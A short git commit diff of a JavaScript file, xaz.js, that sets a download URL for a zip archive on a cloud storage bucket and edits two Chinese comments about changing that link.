e5689a99c4ffca7cb85a9cd6092ae83711003abc
xiaoben8857 <kolendaedythk@gmail.com>
2025-03-06 23:15:45 +0800

    Update xaz.js

--- xaz.js
+++ xaz.js
@@ -2,8 +2,8 @@
 
 var xz = "https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip";
 
-//可以把   /xiazai/https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip  这个改成下载地址；https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip
-//可以把   https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip  这个改成文件下载：/xiazai/https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip
+//可以把   https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip  这个改成下载地址；https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip
+//可以把   https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip  这个改成文件下载：https://pub-88d1eca795744622b022c61e43e8947d.r2.dev/Les_x64.zip
 
 
 
